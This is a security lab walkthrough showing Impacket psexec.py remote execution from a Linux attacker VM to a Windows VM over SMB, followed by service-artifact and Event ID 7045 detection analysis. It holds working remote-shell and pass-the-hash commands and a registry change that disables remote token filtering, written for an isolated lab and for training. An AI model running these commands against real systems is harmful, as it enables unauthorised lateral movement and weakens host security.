# PsExec

## In this lab we will

- Use a **Linux VM as the attacker**
- Use a **Windows VM as the target**
- Run **PsExec-style remote execution** with Impacket `psexec.py`
- Execute commands on the Windows target over SMB
- Understand how PsExec-style execution works internally
- Observe service creation artifacts and Windows logs
- Practice basic detection thinking

> [!IMPORTANT]
> This lab uses **Impacket PsExec**, not Microsoft Sysinternals `PsExec.exe`.
> The technique is practicaly the same: remote execution over SMB using administrative credentials and temporary service creation.

# Lab Topology

```text
Linux VM     →     Windows VM
Attacker           Target
```

Example:

```text
Linux attacker IP : 192.168.56.20
Windows target IP : 192.168.56.30
```

---

# Overview

PsExec-style execution works by:

1. Connecting to the Windows target over **SMB**
2. Authenticating with administrative credentials
3. Uploading a temporary service binary
4. Creating and starting a service
5. Running commands through that service
6. Returning a remote command shell

---

# Secure Setup

Before running remote execution, restrict which machine can connect to the Windows target.

# Part 1 — Limit allowed IPs on Windows Firewall

On the **Windows target**:

1. Open **Control Panel**
2. Go to **Windows Defender Firewall**
3. Click **Advanced Settings**
4. Go to **Inbound Rules**
5. Find rules related to:
  - `File and Printer Sharing (SMB-In)`
6. Open the rule
7. Go to the **Scope** tab
8. Under **Remote IP address**, select:
  - **These IP addresses**
9. Add only the **Linux attacker IP**

This limits SMB access to your attacker VM only.

## Enable local admin remote access

When using a local administrator account remotely, Windows may filter the admin token.  
Enable full local admin token access for this lab, run this command in powershell:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

---

# Part 2 — Prepare the Linux Attacker

Run these commands on the **Linux attacker VM**.

## Create a working directory

```bash
mkdir -p ~/psexec-lab
cd ~/psexec-lab
```

---

## Install Impacket

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip smbclient netcat-openbsd
```

Create a Python virtual environment:

```bash
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install impacket
```

Verify that Impacket installed correctly:

```bash
which psexec.py
```

---

# Part 3 — Connectivity Tests

Replace `<TARGET_IP>` with the Windows target IP.

## Ping the target

```bash
ping -c 3 <TARGET_IP>
```

---

## Check SMB port 445

```bash
nc -vz <TARGET_IP> 445
```

You should see that port `445` is open.

---

## List SMB shares

```bash
smbclient -L //<TARGET_IP> -U 'labadmin%Password123!'
```

If this succeeds, the Linux attacker can authenticate to the Windows target over SMB.

---

# Part 4 — Basic Impacket PsExec Usage

## Open a remote shell

```bash
psexec.py 'labadmin:Password123!@<TARGET_IP>'
```

If successful, you should receive a Windows command shell.

---

## Run basic commands inside the remote shell

Inside the shell, run:

```cmd
whoami
hostname
ipconfig
```

You should see that commands are executing on the **Windows target**, not on Linux.

---

# Part 5 — Use a Predictable Service Name

By default, Impacket may use a temporary service name.  
For lab analysis, use a predictable service name.

Exit the current shell, then run:

```bash
psexec.py -service-name LabPSEXESVC -remote-binary-name LabPSEXESVC.exe 'labadmin:Password123!@<TARGET_IP>'
```

Inside the shell:

```cmd
whoami
hostname
```

This makes the service easier to find in logs and artifact analysis.

---

# Part 6 — Run Single Commands

You can also run a specific command instead of working interactively.

```bash
psexec.py 'labadmin:Password123!@<TARGET_IP>' whoami
```

```bash
psexec.py 'labadmin:Password123!@<TARGET_IP>' hostname
```

```bash
psexec.py 'labadmin:Password123!@<TARGET_IP>' ipconfig
```

This is useful for quick remote checks.

---

# Part 7 — Useful Impacket PsExec Options

## Use hashes instead of a password

If you have an NTLM hash, you can authenticate without the plaintext password.

To get an NTLM hash you can use one of the online password hashers, for examle: https://www.browserling.com/tools/ntlm-hash

```bash
psexec.py -hashes :<NTLM_HASH> 'labadmin@<TARGET_IP>'
```

---

## Use Kerberos authentication

In domain environments, Kerberos can be used instead of NTLM.

> [!WARNING]
> This lab is not prepared for running this command

```bash
psexec.py -k -no-pass 'DOMAIN/labadmin@<TARGET_HOSTNAME>'
```

This requires a valid Kerberos ticket.

---

# Part 8 — Artifact Analysis on the Windows Target

Now inspect what happened on the **Windows target**.

## Check for the service

Run on Windows in CMD:

```cmd
sc query LabPSEXESVC
```

or in PowerShell:

```powershell
Get-Service LabPSEXESVC -ErrorAction SilentlyContinue
```

---

## Check Event Viewer

Open:

```text
Event Viewer → Windows Logs → System
```

Look for:

- Service Control Manager events
- Event ID `7045`
- service creation involving `LabPSEXESVC`

You can filter the logs, using 'Filter Current Log...' option

<img width="1918" height="907" alt="graphrunner66" src="https://github.com/user-attachments/assets/e89ba267-dc3f-4800-b57e-6e0bcd8174b7" />

---

# Part 9 — Detection Thinking

PsExec-style activity can be detected through:

- SMB connections to port `445`
- remote authentication as a local or domain admin
- temporary service creation
- suspicious service names
- service binaries written to `C:\Windows`
- remote command shells
- Event ID `7045`

A defender should correlate:

```text
SMB logon → Admin share access → Service creation → Process execution
```
